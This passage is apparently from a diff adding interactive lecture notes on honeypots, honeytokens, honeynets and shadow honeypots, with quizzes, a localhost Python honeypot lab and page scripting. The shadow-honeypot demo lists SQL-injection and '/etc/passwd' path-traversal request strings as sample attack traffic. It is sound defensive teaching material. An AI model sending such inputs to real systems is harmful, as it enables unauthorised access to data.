+  <div class="callout reveal"><b>LLMs as honeypot engines</b>Large language models are good at producing realistic, context-aware responses (shell output, HTTP/REST API responses) on the fly, which makes medium-interaction honeypots far more convincing. Recent research, e.g. work by <b>Anıl Sezgin</b> on using LLMs to generate REST API honeypots, and evaluation frameworks for LLM-powered HTTP honeypots, explores this direction. Weaknesses to discuss: latency, inconsistent answers between commands, cost, and prompt-injection by the attacker.</div>
+
+  <h3>Common tools (for further study)</h3>
+  <div class="tablewrap reveal"><table>
+    <tr><th>Tool</th><th>Type</th><th>Notes</th></tr>
+    <tr><td><b>Cowrie</b></td><td>Medium-interaction SSH/Telnet</td><td>Fake shell &amp; file system, logs commands, captures downloads.</td></tr>
+    <tr><td><b>Dionaea</b></td><td>Low-interaction, malware capture</td><td>Emulates SMB, HTTP, FTP, MSSQL… to collect malware.</td></tr>
+    <tr><td><b>Conpot</b></td><td>ICS / SCADA</td><td>Emulates industrial protocols such as Modbus and S7.</td></tr>
+    <tr><td><b>OpenCanary</b></td><td>Low-interaction, production</td><td>Lightweight multi-service honeypot that sends alerts.</td></tr>
+    <tr><td><b>T-Pot</b></td><td>Platform</td><td>Bundles many honeypots with an ELK dashboard.</td></tr>
+    <tr><td><b>Canarytokens</b></td><td>Honeytokens</td><td>Generates trackable fake documents, URLs, API keys.</td></tr>
+  </table></div>
+
+  <div class="quiz" data-id="q4" data-answer="0">
+    <div class="qh">Check yourself</div>
+    <div class="q">Your honeypot answers every command instantly, and <code>cat</code> on a file you just wrote prints nothing. What is the problem?</div>
+    <div class="opts">
+      <button class="opt">It is easy to fingerprint: timing and state are unrealistic.</button>
+      <button class="opt">Nothing — speed makes the honeypot more attractive.</button>
+      <button class="opt">It needs more open ports.</button>
+      <button class="opt">It should be moved into the production network.</button>
+    </div>
+    <div class="fb">Real systems have latency and keep state. Inconsistency tells a careful attacker they are in a trap.</div>
+  </div>
+</section>
+
+<!-- ============ 5 ============ -->
+<section class="chapter" id="s5" data-title="5. Honeytokens">
+  <div class="kicker">Section 5</div>
+  <h2>Honeytokens</h2>
+  <div class="def reveal"><b>Honeytoken</b> — a decoy piece of <em>data</em> (a fake document, credential, API key, database row or email address) that has no legitimate use in your system. When anyone reads, uses or sends it, an alert is raised.</div>
+  <p>A honeytoken is a <b>tripwire</b>, not a trap system. It does not engage the attacker; it silently tells you that someone touched something nobody should touch — and often <em>where</em> the data ended up.</p>
+
+  <h3>Common types</h3>
+  <div class="grid2 reveal">
+    <div class="mini"><b>🔑 Credentials</b>Fake username/password, API token or cloud access key. Any login attempt with them = alert.</div>
+    <div class="mini"><b>📄 Documents</b>Dummy files such as <code>passwords.xlsx</code> or <code>financial_report.docx</code> that “phone home” when opened.</div>
+    <div class="mini"><b>🗄 Database records</b>Fake rows (e.g. a customer that does not exist). If that row appears in a query, an export or a leak, you know.</div>
+    <div class="mini"><b>✉ Email addresses</b>An address used nowhere legitimate. If it ever receives mail, your list was stolen or sold.</div>
+    <div class="mini"><b>🔗 URLs / DNS names</b>A unique link or hostname; resolving it reveals the visitor’s IP.</div>
+    <div class="mini"><b>☁ Cloud keys</b>Fake cloud keys left in code or config; every API call with them is logged by the provider and alerts you.</div>
+  </div>
+
+  <div class="callout reveal"><b>Deliberately leaked secrets</b>Sometimes you will see screenshots or public code repositories that show API keys or passwords in plain sight. Some of these are planted on purpose: the keys may even “work”, but they lead only to monitored decoys. Lesson for attackers — and for us: a leaked secret is not necessarily a real secret.</div>
+
+  <h3>Try it — the file share</h3>
+  <p class="small">You have broken into a company file share. Browse around and open whatever looks valuable. Some files are honeytokens… Then press <b>Reveal</b> to see which ones.</p>
+  <div class="fx" id="fx">
+    <div class="tree" id="fxTree"></div>
+    <div class="files"><div id="fxFiles"></div><div class="preview" id="fxPreview">Click a file to open it.</div>
+      <div style="margin-top:10px;display:flex;gap:8px;align-items:center;flex-wrap:wrap"><button class="btn" id="fxReveal">Reveal honeytokens</button><span class="small" id="fxScore"></span></div>
+    </div>
+  </div>
+
+  <h3>Why use them?</h3>
+  <div class="grid2 reveal">
+    <div class="mini"><b>Early detection</b>Real users never touch decoys, so interaction is a strong sign of unauthorised access — often before real damage.</div>
+    <div class="mini"><b>Low false positives</b>No legitimate purpose → alerts are almost always genuine.</div>
+    <div class="mini"><b>Cost-effective</b>Lightweight, no extra infrastructure, easy to scatter across many systems.</div>
+    <div class="mini"><b>Threat intelligence</b>Reveal attacker IP/location, tools, and how they move through the network (lateral movement).</div>
+  </div>
+
+  <h3>How to deploy them well</h3>
+  <ol>
+    <li><b>Place them where an attacker looks</b> — sensitive directories, admin desktops, config files, password managers, code repositories.</li>
+    <li><b>Make them look real</b> — realistic names, sizes, dates and content. <code>honeytoken.txt</code> catches no one.</li>
+    <li><b>Connect them to monitoring</b> — IDS/SIEM rules or a canary service, so access becomes an alert someone actually sees.</li>
+    <li><b>Rotate and update</b> — attackers also learn; old, never-changing decoys get recognised.</li>
+    <li><b>Test regularly</b> — trigger your own tokens. You think everything is in place, but does the alert really arrive?</li>
+    <li><b>Tell the right people</b> — the SOC must know they exist; ordinary staff should not, or they may open them out of curiosity.</li>
+  </ol>
+
+  <div class="quiz" data-id="q5" data-answer="1">
+    <div class="qh">Check yourself</div>
+    <div class="q">A fake customer record “Mehmet Yılmaz, mehmet.y.7731@…” exists only in your CRM database. One day that address receives spam. What does this most likely mean?</div>
+    <div class="opts">
+      <button class="opt">The mail server is misconfigured.</button>
+      <button class="opt">Data from the CRM has been copied out and is being used or sold.</button>
+      <button class="opt">A real customer with that name has signed up.</button>
+      <button class="opt">The honeytoken has expired.</button>
+    </div>
+    <div class="fb">The address existed nowhere else, so the only way to know it is to have the database contents — a strong leak indicator.</div>
+  </div>
+</section>
+
+<!-- ============ 6 ============ -->
+<section class="chapter" id="s6" data-title="6. Honeypot vs honeytoken">
+  <div class="kicker">Section 6</div>
+  <h2>Honeypot vs honeytoken</h2>
+  <div class="tablewrap reveal"><table>
+    <tr><th></th><th>Honeypot</th><th>Honeytoken</th></tr>
+    <tr><td><b>What it is</b></td><td>A full decoy system or service</td><td>A piece of decoy data</td></tr>
+    <tr><td><b>Engages attacker?</b></td><td>Yes — attacker interacts with it</td><td>No — silent tripwire</td></tr>
+    <tr><td><b>Information gained</b></td><td>In-depth: commands, tools, malware</td><td>“Someone touched it” + where/when (IP, time)</td></tr>
+    <tr><td><b>Cost &amp; effort</b></td><td>Medium to high</td><td>Very low</td></tr>
+    <tr><td><b>Risk</b></td><td>Can be abused if containment fails</td><td>Almost none</td></tr>
+    <tr><td><b>Best for</b></td><td>Research, threat intelligence</td><td>Early warning, leak detection, insider threats</td></tr>
+  </table></div>
+  <p>They work best <b>together</b>: put honeytokens <em>inside</em> a honeypot (fake configs, fake DB credentials) to see exactly what attackers steal and where they try to use it.</p>
+
+  <h3>Flashcards — click to flip</h3>
+  <div class="grid3" id="flips"></div>
+
+  <div class="quiz" data-id="q6" data-answer="2">
+    <div class="qh">Check yourself</div>
+    <div class="q">Which is a honeytoken rather than a honeypot?</div>
+    <div class="opts">
+      <button class="opt">A fake FTP server exposed on the internet</button>
+      <button class="opt">A Cowrie instance on port 22</button>
+      <button class="opt">An unused AWS access key left in a config file, wired to an alert</button>
+      <button class="opt">A network of fake Windows workstations</button>
+    </div>
+    <div class="fb">The key is data, not a system. Its only job is to raise an alert when used.</div>
+  </div>
+</section>
+
+<!-- ============ 7 ============ -->
+<section class="chapter" id="s7" data-title="7. Honeynets & honeyfarms">
+  <div class="kicker">Section 7</div>
+  <h2>Honeynets &amp; honeyfarms</h2>
+  <p>A <b>honeynet</b> is a network of honeypots: each node is a honeypot, but together they mimic a complete environment — workstations, a file server, a database, maybe a domain controller. Attackers who get in can scan, pivot and move laterally, and we see all of it.</p>
+  <ul>
+    <li>Used to detect, deflect and analyse attacks at network level.</li>
+    <li>Gives <b>high visibility</b> into attacker behaviour — especially lateral movement, which a single honeypot cannot show.</li>
+    <li>Few false positives (still no legitimate users).</li>
+    <li>Can reveal <b>zero-day exploits</b>: when an unknown technique works, we have the full traffic and the compromised host.</li>
+  </ul>
+  <p>A classic honeynet sits behind a <b>honeywall</b>, a gateway that provides three functions:</p>
+  <div class="grid3 reveal">
+    <div class="mini"><b>Data control</b>Limit outbound traffic so the compromised honeynet cannot attack others (rate limits, blocking known exploit traffic).</div>
+    <div class="mini"><b>Data capture</b>Record everything: packets, keystrokes, files — without the attacker noticing.</div>
+    <div class="mini"><b>Data analysis</b>Turn raw logs into knowledge: who, how, what was the goal.</div>
+  </div>
+
+  <h3>Honeyfarm</h3>
+  <p>A <b>honeyfarm</b> is the large-scale, centrally managed version: many honeypots and honeynets, often in many locations or cloud regions, all reporting to one place. Traffic seen by lightweight sensors can be redirected to a central farm of (often virtualised) honeypots. Click each component to explore the architecture:</p>
+
+  <svg class="diagram reveal" viewBox="0 0 720 300" id="farmSvg" role="img" aria-label="Honeyfarm architecture">
+    <path class="wire flow" d="M200 70 L300 140"/><path class="wire flow" d="M200 230 L300 160"/>
+    <path class="wire flow" d="M420 140 L520 70"/><path class="wire flow" d="M420 160 L520 230"/>
+    <g class="clickable" data-k="mgmt"><rect class="box" x="20" y="40" width="180" height="60" rx="10"/><text class="lbl" x="110" y="66" text-anchor="middle">Central management</text><text class="sub" x="110" y="84" text-anchor="middle">config · deploy · update</text></g>
+    <g class="clickable" data-k="sensors"><rect class="box hp" x="20" y="200" width="180" height="60" rx="10"/><text class="lbl" x="110" y="226" text-anchor="middle">Distributed sensors</text><text class="sub" x="110" y="244" text-anchor="middle">honeypots · honeynets</text></g>
+    <g class="clickable" data-k="core"><rect class="box" x="300" y="115" width="120" height="70" rx="12"/><text class="lbl" x="360" y="146" text-anchor="middle" font-weight="700">Honeyfarm</text><text class="sub" x="360" y="164" text-anchor="middle">core</text></g>
+    <g class="clickable" data-k="agg"><rect class="box ids" x="520" y="40" width="180" height="60" rx="10"/><text class="lbl" x="610" y="66" text-anchor="middle">Data aggregation</text><text class="sub" x="610" y="84" text-anchor="middle">logs · telemetry · attack data</text></g>
+    <g class="clickable" data-k="analysis"><rect class="box ids" x="520" y="200" width="180" height="60" rx="10"/><text class="lbl" x="610" y="226" text-anchor="middle">Analysis engines</text><text class="sub" x="610" y="244" text-anchor="middle">ML · statistics · analysts</text></g>
+  </svg>
+  <div class="infobox" id="farmInfo">Click a box in the diagram.</div>
+
+  <h3>Honeynet vs honeyfarm</h3>
+  <div class="tablewrap reveal"><table>
+    <tr><th></th><th>Honeynet</th><th>Honeyfarm</th></tr>
+    <tr><td><b>Scale</b></td><td>One simulated network</td><td>Many honeynets and honeypots</td></tr>
+    <tr><td><b>Purpose</b></td><td>Trap and study intrusions in one environment</td><td>Large-scale, wide-area monitoring and threat intelligence</td></tr>
+    <tr><td><b>Management</b></td><td>Often local / manual</td><td>Centralised and automated</td></tr>
+    <tr><td><b>Complexity</b></td><td>Moderate</td><td>High (orchestration, virtualisation, data pipelines)</td></tr>
+    <tr><td><b>Typical users</b></td><td>Security teams, researchers</td><td>Governments, large enterprises, academia, security vendors</td></tr>
+  </table></div>
+
+  <div class="quiz" data-id="q7" data-answer="0">
+    <div class="qh">Check yourself</div>
+    <div class="q">Which honeywall function stops your compromised honeynet from being used to attack a third party?</div>
+    <div class="opts">
+      <button class="opt">Data control</button>
+      <button class="opt">Data capture</button>
+      <button class="opt">Data analysis</button>
+      <button class="opt">Data aggregation</button>
+    </div>
+    <div class="fb">Data control limits and filters outbound traffic. Without it, you could become a launch pad for attacks — a legal and ethical problem.</div>
+  </div>
+</section>
+
+<!-- ============ 8 ============ -->
+<section class="chapter" id="s8" data-title="8. Shadow honeypots">
+  <div class="kicker">Section 8</div>
+  <h2>Shadow honeypots</h2>
+  <p>A <b>shadow honeypot</b> is normally <b>not active</b>. It is a copy (or instrumented version) of the real application that is used only when an anomaly detector or IDS flags traffic as suspicious. That traffic is diverted to the shadow <b>in real time</b>; the attacker carries on as if everything were normal, while everything is logged and later analysed to improve defences.</p>
+  <p>Benefit: an IDS alone must choose between <em>blocking</em> (risking false positives that hurt real users) and <em>allowing</em> (risking an attack). A shadow honeypot sidesteps this: suspicious-but-uncertain requests get a realistic answer from a safe copy.</p>
+
+  <div class="card reveal">
+    <b>Try it — send requests through the IDS</b>
+    <div class="shadow-ctl">
+      <button class="btn" data-req="ok">GET /products?id=42</button>
+      <button class="btn" data-req="ok2">POST /login (normal)</button>
+      <button class="btn" data-req="bad">GET /products?id=42' OR 1=1--</button>
+      <button class="btn" data-req="bad2">GET /../../etc/passwd</button>
+      <button class="btn" data-req="fp">GET /search?q=O'Brien</button>
+    </div>
+    <svg class="diagram" viewBox="0 0 720 230" id="shadowSvg">
+      <path class="wire" d="M95 115 L240 115"/>
+      <path class="wire" d="M360 100 L520 50"/>
+      <path class="wire" d="M360 130 L520 180" id="shadowWire"/>
+      <g><rect class="box bad" x="10" y="85" width="85" height="60" rx="10"/><text class="lbl" x="52" y="112" text-anchor="middle">Client</text><text class="sub" x="52" y="130" text-anchor="middle">? / attacker</text></g>
+      <g><rect class="box ids" x="240" y="80" width="120" height="70" rx="10"/><text class="lbl" x="300" y="110" text-anchor="middle" font-weight="700">IDS / anomaly</text><text class="sub" x="300" y="128" text-anchor="middle">detector</text></g>
+      <g><rect class="box" x="520" y="20" width="185" height="60" rx="10"/><text class="lbl" x="612" y="46" text-anchor="middle">Production app</text><text class="sub" x="612" y="64" text-anchor="middle">real data</text></g>
+      <g id="shadowBox" style="opacity:.35;transition:opacity .4s"><rect class="box hp" x="520" y="150" width="185" height="60" rx="10"/><text class="lbl" x="612" y="176" text-anchor="middle">Shadow honeypot</text><text class="sub" x="612" y="194" text-anchor="middle" id="shadowState">idle</text></g>
+      <g id="packets"></g>
+    </svg>
+    <div class="counter"><span>To production: <b id="cProd">0</b></span><span>Diverted to shadow: <b id="cShadow">0</b></span><span>Logged attacks: <b id="cLog">0</b></span></div>
+    <div class="infobox" id="shadowInfo" style="margin-top:8px">Click a request above.</div>
+  </div>
+
+  <h3>Characteristics</h3>
+  <div class="tablewrap reveal"><table>
+    <tr><th>Feature</th><th>Description</th></tr>
+    <tr><td><b>Stealth</b></td><td>Operates silently; not visible in normal scans because it only exists for diverted traffic.</td></tr>
+    <tr><td><b>Dynamic deployment</b></td><td>Activated only when needed, reducing exposure.</td></tr>
+    <tr><td><b>Realistic interaction</b></td><td>Runs the real application logic (or a clone), so it is highly convincing.</td></tr>
+    <tr><td><b>Integrated monitoring</b></td><td>Usually connected to analytics and threat-intelligence platforms.</td></tr>
+  </table></div>
+
+  <h3>Classic honeypot vs shadow honeypot</h3>
+  <div class="tablewrap reveal"><table>
+    <tr><th></th><th>Honeypot</th><th>Shadow honeypot</th></tr>
+    <tr><td><b>Deployment</b></td><td>Static</td><td>Dynamic / triggered</td></tr>
+    <tr><td><b>Visibility</b></td><td>Discoverable by scanning</td><td>Invisible to the attacker</td></tr>
+    <tr><td><b>Interaction</b></td><td>Often simulated</td><td>Realistic or cloned</td></tr>
+    <tr><td><b>Use case</b></td><td>Broad research</td><td>Targeted, adaptive defence</td></tr>
+    <tr><td><b>Risk</b></td><td>Higher if compromised</td><td>Lower (short-lived, isolated)</td></tr>
+  </table></div>
+
+  <h3>Example use cases</h3>
+  <ul>
+    <li><b>Web applications</b> — a suspicious HTTP request triggers a shadow copy of the full backend that answers instead of the real one.</li>
+    <li><b>Cloud environments</b> — shadow honeypots spin up as containers or VMs to capture anomalous traffic in dynamic infrastructure.</li>
+    <li><b>Zero-day research</b> — novel attacks that evade signatures still look anomalous; observing them in the shadow reveals the new technique.</li>
+  </ul>
+
+  <div class="quiz" data-id="q8" data-answer="3">
+    <div class="qh">Check yourself</div>
+    <div class="q">A user searches for “O’Brien” and the IDS flags the apostrophe as possible SQL injection. With a shadow honeypot, what happens?</div>
+    <div class="opts">
+      <button class="opt">The user is blocked and sees an error.</button>
+      <button class="opt">The request goes to production unchecked.</button>
+      <button class="opt">The shadow honeypot is permanently exposed on the internet.</button>
+      <button class="opt">The request is answered by the shadow copy; the user is not blocked and the event is logged for analysis.</button>
+    </div>
+    <div class="fb">That is the point of shadowing: uncertain traffic is handled safely instead of being blocked. (In the original design, the shadow’s state changes are rolled back if an attack is confirmed, and committed if the request turns out benign.)</div>
+  </div>
+</section>
+
+<!-- ============ 9 ============ -->
+<section class="chapter" id="s9" data-title="9. Placement, risks & ethics">
+  <div class="kicker">Section 9</div>
+  <h2>Placement, risks &amp; ethics</h2>
+  <h3>Where do we put them?</h3>
+  <div class="grid3 reveal">
+    <div class="mini"><b>Internet-facing</b>Outside or in the DMZ. Receives huge amounts of scanning and bot traffic — great for research, noisy for alerts.</div>
+    <div class="mini"><b>Internal network</b>Next to real servers. Should <em>never</em> be touched; any hit means someone is already inside (or an insider is snooping).</div>
+    <div class="mini"><b>Inside data</b>Honeytokens in databases, file shares, code repos, cloud accounts and email lists.</div>
+  </div>
+
+  <h3>Risks and limitations</h3>
+  <ul>
+    <li><b>Abuse as a launch pad</b> — a compromised high-interaction honeypot can attack others. Strict outbound control is mandatory.</li>
+    <li><b>Fingerprinting</b> — skilled attackers detect honeypots and avoid them, or feed false information.</li>
+    <li><b>Narrow field of view</b> — a honeypot only sees attacks aimed at itself; it does not replace firewalls, IDS, patching or EDR.</li>
+    <li><b>Maintenance</b> — honeypots must be updated, monitored and tested, or they become noise (or a liability).</li>
+  </ul>
+
+  <h3>Legal &amp; ethical questions (for discussion)</h3>
+  <ul>
+    <li><b>Privacy / data protection</b> — honeypots record IP addresses and possibly personal data. Under KVKK (Turkey) or GDPR (EU), you still need a lawful basis, retention limits and security for these logs.</li>
+    <li><b>Liability</b> — if your honeypot is used to harm a third party, you may be responsible.</li>
+    <li><b>Entrapment</b> — usually discussed but rarely relevant for private defenders: honeypots do not <em>induce</em> a crime, they only observe one. Still, rules differ by country; ask a lawyer before a real deployment.</li>
+    <li><b>Hack-back</b> — using honeypot data to attack the attacker is illegal in most jurisdictions. Report, do not retaliate.</li>
+  </ul>
+
+  <h3>Real-world usage</h3>
+  <div class="grid3 reveal">
+    <div class="mini"><b>Military / government</b>High-interaction honeypots and honeynets to distract attackers and make them waste time and resources, and to study state-level threats.</div>
+    <div class="mini"><b>Enterprise</b>Internal honeypots and honeytokens to detect intrusions and lateral movement early, and to catch insiders accessing data they are not authorised to see.</div>
+    <div class="mini"><b>Academic / research</b>Capturing malware payloads, studying ransomware behaviour, tracking botnet propagation, publishing datasets.</div>
+  </div>
+
+  <div class="quiz" data-id="q9" data-answer="1">
+    <div class="qh">Check yourself</div>
+    <div class="q">Your internal honeypot (never announced to anyone) logs an SMB login attempt from an HR laptop. What is the best first reaction?</div>
+    <div class="opts">
+      <button class="opt">Ignore it — internal traffic is trusted.</button>
+      <button class="opt">Treat it as a real incident: investigate the laptop (compromise or insider).</button>
+      <button class="opt">Attack the laptop back to see who is using it.</button>
+      <button class="opt">Delete the honeypot because it was discovered.</button>
+    </div>
+    <div class="fb">An internal decoy has no legitimate users. A hit is either malware moving laterally or a person looking where they should not — both need investigation.</div>
+  </div>
+</section>
+
+<!-- ============ 10 ============ -->
+<section class="chapter" id="s10" data-title="10. Lab: a tiny web honeypot">
+  <div class="kicker">Section 10 · Lab</div>
+  <h2>Lab: building a small web honeypot</h2>
+  <p>In the lab we build a deliberately “vulnerable-looking” website that <b>logs everything</b>. It never executes anything the attacker sends; it only pretends. Below is a minimal starting point using only Python’s standard library.</p>
+  <div class="callout red"><b>Lab safety rules</b>Run it on <code>127.0.0.1</code> or an isolated lab network/VM only. Do not expose it to the internet without your instructor’s approval and proper isolation. Never run real vulnerable software on a university or personal network.</div>
+
+  <div class="codehead"><b>honeyweb.py</b><button class="btn" id="copyCode">Copy code</button></div>
+<pre class="code" id="codeBlock"><span class="c-c"># honeyweb.py — minimal logging web honeypot (lab use only)</span>
+<span class="c-k">import</span> json, datetime
+<span class="c-k">from</span> http.server <span class="c-k">import</span> BaseHTTPRequestHandler, HTTPServer
+<span class="c-k">from</span> urllib.parse <span class="c-k">import</span> urlparse, parse_qs
+
+LOGIN_PAGE = <span class="c-s">b"""&lt;html&gt;&lt;title&gt;Admin Panel&lt;/title&gt;&lt;body&gt;
+&lt;h2&gt;Site Administration&lt;/h2&gt;
+&lt;form method=POST action=/admin/login&gt;
+ User &lt;input name=user&gt; Pass &lt;input name=pass type=password&gt;
+ &lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"""</span>
+BAIT_PATHS = {<span class="c-s">"/admin"</span>, <span class="c-s">"/wp-login.php"</span>, <span class="c-s">"/phpmyadmin"</span>, <span class="c-s">"/.env"</span>, <span class="c-s">"/backup.zip"</span>}
+
+<span class="c-k">def</span> <span class="c-f">log</span>(event):
+    event[<span class="c-s">"time"</span>] = datetime.datetime.utcnow().isoformat() + <span class="c-s">"Z"</span>
+    <span class="c-k">with</span> open(<span class="c-s">"honey.log"</span>, <span class="c-s">"a"</span>) <span class="c-k">as</span> f:
+        f.write(json.dumps(event) + <span class="c-s">"\n"</span>)
+
+<span class="c-k">class</span> <span class="c-f">Honey</span>(BaseHTTPRequestHandler):
+    server_version = <span class="c-s">"Apache/2.4.41 (Ubuntu)"</span>   <span class="c-c"># look like a real server</span>
+    sys_version = <span class="c-s">""</span>
+
+    <span class="c-k">def</span> <span class="c-f">_record</span>(self, body=<span class="c-s">""</span>):
+        u = urlparse(self.path)
+        log({<span class="c-s">"ip"</span>: self.client_address[0], <span class="c-s">"method"</span>: self.command,
+             <span class="c-s">"path"</span>: u.path, <span class="c-s">"query"</span>: parse_qs(u.query),
+             <span class="c-s">"ua"</span>: self.headers.get(<span class="c-s">"User-Agent"</span>), <span class="c-s">"body"</span>: body[:2000],
+             <span class="c-s">"bait"</span>: u.path <span class="c-k">in</span> BAIT_PATHS})
+
+    <span class="c-k">def</span> <span class="c-f">do_GET</span>(self):
+        self._record()
+        <span class="c-k">if</span> self.path.startswith(<span class="c-s">"/admin"</span>) <span class="c-k">or</span> self.path == <span class="c-s">"/wp-login.php"</span>:
+            self._send(200, LOGIN_PAGE)
+        <span class="c-k">elif</span> self.path == <span class="c-s">"/.env"</span>:   <span class="c-c"># honeytoken: fake secrets</span>
+            self._send(200, <span class="c-s">b"DB_USER=app_admin\nDB_PASS=Spring2025!\nAWS_KEY=AKIAFAKEFAKEFAKE0001\n"</span>)
+        <span class="c-k">else</span>:
+            self._send(404, <span class="c-s">b"Not Found"</span>)
+
+    <span class="c-k">def</span> <span class="c-f">do_POST</span>(self):
+        n = int(self.headers.get(<span class="c-s">"Content-Length"</span>, 0))
+        self._record(self.rfile.read(n).decode(errors=<span class="c-s">"replace"</span>))
+        self._send(200, <span class="c-s">b"Invalid username or password."</span>)   <span class="c-c"># always fail</span>
+
+    <span class="c-k">def</span> <span class="c-f">_send</span>(self, code, body):
+        self.send_response(code)
+        self.send_header(<span class="c-s">"Content-Type"</span>, <span class="c-s">"text/html"</span>)
+        self.end_headers(); self.wfile.write(body)
+
+    <span class="c-k">def</span> <span class="c-f">log_message</span>(self, *a): <span class="c-k">pass</span>   <span class="c-c"># keep the console quiet</span>
+
+<span class="c-k">if</span> __name__ == <span class="c-s">"__main__"</span>:
+    HTTPServer((<span class="c-s">"127.0.0.1"</span>, 8080), Honey).serve_forever()</pre>
+
+  <h3>Lab tasks</h3>
+  <ol>
+    <li>Run the script and visit <code>http://127.0.0.1:8080/admin</code>, <code>/.env</code> and a random path. Open <code>honey.log</code>.</li>
+    <li>“Attack” it yourself: try SQL-injection-style inputs in the login form, use <code>curl</code> with a fake User-Agent. Find each attempt in the log.</li>
+    <li>Make it more realistic: add a <code>robots.txt</code> that “hides” <code>/backup.zip</code>, add realistic latency, add more bait pages.</li>
+    <li>Wire the honeytoken: write a second tiny script that alerts (prints in red, or sends a message) when a request reads <code>/.env</code>.</li>
+    <li>Analyse: write a short Python script that counts requests per IP and per path, and lists all usernames/passwords tried.</li>
+    <li>Discuss: how could an attacker tell this is a honeypot? Fix at least two of those clues.</li>
+  </ol>
+  <div class="callout blue"><b>Project idea</b>A full web honeypot with realistic pages, an LLM- or template-driven backend, and a data-processing/visualisation pipeline for the collected logs is a strong graduation project topic.</div>
+</section>
+
+<!-- ============ 11 ============ -->
+<section class="chapter" id="s11" data-title="11. Summary & final quiz">
+  <div class="kicker">Section 11</div>
+  <h2>Summary &amp; final quiz</h2>
+  <div class="grid2 reveal">
+    <div class="mini"><b>Honeypot</b>Decoy system; attacker interacts; rich data; needs containment.</div>
+    <div class="mini"><b>Honeytoken</b>Decoy data; silent tripwire; cheap; very low false positives.</div>
+    <div class="mini"><b>Honeynet / honeyfarm</b>Networks of honeypots; lateral movement visibility; farms add central, large-scale management.</div>
+    <div class="mini"><b>Shadow honeypot</b>Dormant copy of the real app; suspicious traffic diverted in real time; attacker does not notice.</div>
+  </div>
+  <div class="card" id="finalQuiz"></div>
+</section>
+
+<footer>
+  Honeypots &amp; Honeytokens — interactive lecture notes. Works fully offline; nothing is sent anywhere. Notes are stored only in this browser until you export them.
+</footer>
+</main>
+</div>
+<div class="alert" id="alert" role="alert"><b><span class="pulse"></span><span id="alertTitle">HONEYTOKEN TRIGGERED</span></b><span id="alertBody"></span></div>
+
+<script>
+(function(){
+"use strict";
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>Array.from(r.querySelectorAll(s));
+const KEY="honeypot-notes-v1";
+let state={notes:{},done:{},quiz:{},final:{}};
+function load(){try{const s=JSON.parse(localStorage.getItem(KEY)||"null");if(s)state=Object.assign(state,s);}catch(e){}}
+function save(){try{localStorage.setItem(KEY,JSON.stringify(state));}catch(e){}}
+load();
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+
+/* ---------- theme ---------- */
+try{const t=localStorage.getItem(KEY+"-theme");if(t)document.documentElement.dataset.theme=t;}catch(e){}
+$("#themeBtn").onclick=()=>{
+  const cur=document.documentElement.dataset.theme||(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");
+  const next=cur==="dark"?"light":"dark";document.documentElement.dataset.theme=next;
+  try{localStorage.setItem(KEY+"-theme",next);}catch(e){}
+};
+
+/* ---------- TOC, notes boxes, understood ticks ---------- */
+const sections=$$("section.chapter");
+const tocList=$("#tocList");
+sections.forEach(sec=>{
+  const id=sec.id,title=sec.dataset.title;
+  const li=document.createElement("li");
+  li.innerHTML=`<a href="#${id}" data-id="${id}"><span>${esc(title)}</span><span class="tick" id="tick-${id}"></span></a>`;
+  tocList.appendChild(li);
+  // notes box
+  const d=document.createElement("details");d.className="mynotes";d.open=true;
+  d.innerHTML=`<summary><span>✎ My notes — ${esc(title.replace(/^\d+\.\s*/,""))}</span><span class="small">click to ${d.open?"collapse":"open"}</span></summary>
+    <textarea placeholder="Write your own notes, questions for the lecturer, examples…" data-id="${id}"></textarea>
+    <div class="row"><span class="saved" id="saved-${id}"></span></div>`;
+  const ta=$("textarea",d);ta.value=state.notes[id]||"";
+  let t;ta.addEventListener("input",()=>{state.notes[id]=ta.value;clearTimeout(t);$("#saved-"+id).textContent="saving…";t=setTimeout(()=>{save();$("#saved-"+id).textContent="saved ✓ "+new Date().toLocaleTimeString();},400);});
+  d.addEventListener("toggle",()=>{$("summary .small",d).textContent="click to "+(d.open?"collapse":"open");});
+  const lab=document.createElement("label");lab.className="understood";
+  lab.innerHTML=`<input type="checkbox" data-id="${id}"> I understand this section`;
+  const cb=$("input",lab);cb.checked=!!state.done[id];
+  cb.addEventListener("change",()=>{state.done[id]=cb.checked;save();updateProgress();});
+  sec.appendChild(d);sec.appendChild(lab);
+});
+function updateProgress(){
+  let n=0;sections.forEach(s=>{const on=!!state.done[s.id];if(on)n++;const t=$("#tick-"+s.id);t.classList.toggle("done",on);t.textContent=on?"✓":"";});
+  $("#progBar").style.width=(n/sections.length*100)+"%";
+  $("#progTxt").textContent=`${n} of ${sections.length} sections understood`;
+}
+updateProgress();
+// active section
+const links=$$(".toc a");
+const io=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){links.forEach(a=>a.classList.toggle("active",a.dataset.id===e.target.id));}});},{rootMargin:"-30% 0px -60% 0px"});
+sections.forEach(s=>io.observe(s));
+// reading bar
+addEventListener("scroll",()=>{const h=document.documentElement;$("#readbar").style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight)*100)+"%";},{passive:true});
+// mobile menu
+$("#menuBtn").onclick=()=>$("#toc").classList.toggle("open");
+links.forEach(a=>a.addEventListener("click",()=>$("#toc").classList.remove("open")));
+// reveal
+const ro=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){e.target.classList.add("in");ro.unobserve(e.target);}}),{threshold:.12});
+$$(".reveal").forEach(el=>ro.observe(el));
+
+/* ---------- hero packets ---------- */
+(function(){
+  const g=$("#heroDots"),paths=$$(".hero path.wire");if(!paths.length)return;
+  const dots=[];
+  for(let i=0;i<6;i++){const c=document.createElementNS("http://www.w3.org/2000/svg","circle");c.setAttribute("r","4");c.setAttribute("fill","var(--bad)");g.appendChild(c);dots.push({c,p:paths[i%3],t:i/6});}
+  const reduce=matchMedia("(prefers-reduced-motion: reduce)").matches;
+  function step(){dots.forEach(d=>{d.t=(d.t+0.004)%1;const L=d.p.getTotalLength(),pt=d.p.getPointAtLength(d.t*L);d.c.setAttribute("cx",pt.x);d.c.setAttribute("cy",pt.y);d.c.setAttribute("opacity",d.t>.9?(1-d.t)*10:1);});if(!reduce)requestAnimationFrame(step);}
+  step();
+})();
+
+/* ---------- interaction spectrum ---------- */
+const SPEC=[
